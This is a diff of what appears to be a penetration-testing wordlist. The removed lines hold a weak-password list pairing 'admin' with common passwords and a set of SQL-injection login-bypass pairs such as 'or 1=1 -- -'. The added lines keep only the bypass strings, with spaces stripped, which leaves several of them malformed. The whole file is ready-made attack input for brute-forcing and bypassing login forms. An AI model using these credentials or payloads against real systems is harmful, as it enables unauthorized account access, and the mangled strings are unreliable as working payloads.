@@ -1,83 +1,11 @@
- 
- #弱口令
-
- admin admin
- admin 123456
- admin admin888
- admin 12345678
- admin 123123
- admin 88888888
- admin 888888
- admin password
- admin 123456a
- admin admin123
- admin admin123456
- admin admin666
- admin admin2018
- admin 123456789
- admin 654321
- admin 666666
- admin 66666666
- admin 1234567890
- admin 8888888
- admin 987654321
- admin 0123456789
- admin 12345
- admin 1234567
- admin 000000
- admin 111111
- admin 5201314
- admin 123123
-
- #万能密码
-
-
-admin' or 'a'='a /admin' or 'a'='a
-
-admin' or 'a'='a / 'or'='or'
-
-admin' or 'a'='a / admin' or '1'='1' or 1=1
-
-admin' or 'a'='a / ')or('a'='a
-
-admin' or 'a'='a / 'or 1=1 -- -
-
-'or'='or' / admin' or 'a'='a
-
-'or'='or' / 'or'='or'
-
-'or'='or' / admin' or '1'='1' or 1=1
-
-'or'='or' / ')or('a'='a
-
-'or'='or' / 'or 1=1 -- -
-
-admin' or '1'='1' or 1=1 / admin' or 'a'='a
-
-admin' or '1'='1' or 1=1 / 'or'='or'
-
-admin' or '1'='1' or 1=1 / admin' or '1'='1' or 1=1
-
-admin' or '1'='1' or 1=1 / ')or('a'='a
-
-admin' or '1'='1' or 1=1 / 'or 1=1 -- -
-
-')or('a'='a admin' / or 'a'='a
-
-')or('a'='a / 'or'='or'
-
-')or('a'='a admin' / or '1'='1' or 1=1
-
-')or('a'='a ')or('a'='a
-
-')or('a'='a / 'or 1=1 -- -
-
-'or 1=1 -- - / admin' / or 'a'='a
-
-'or 1=1 -- - / 'or'='or'
-
-'or 1=1 -- - / admin' / or '1'='1' or 1=1
-
-'or 1=1 -- - / ')or('a'='a
-
-'or 1=1 -- - / 'or 1=1 -- -
+admin'or'a'='a
+'or'='or'
+admin'or'1'='1'or1=1
+')or('a'='a
+'or1=1---
+')or('a'='aadmin'
+or'a'='a
+or'1'='1'or1=1
+')or('a'='a')or('a'='a
+admin'/or'a'='a
+admin'/or'1'='1'or1=1
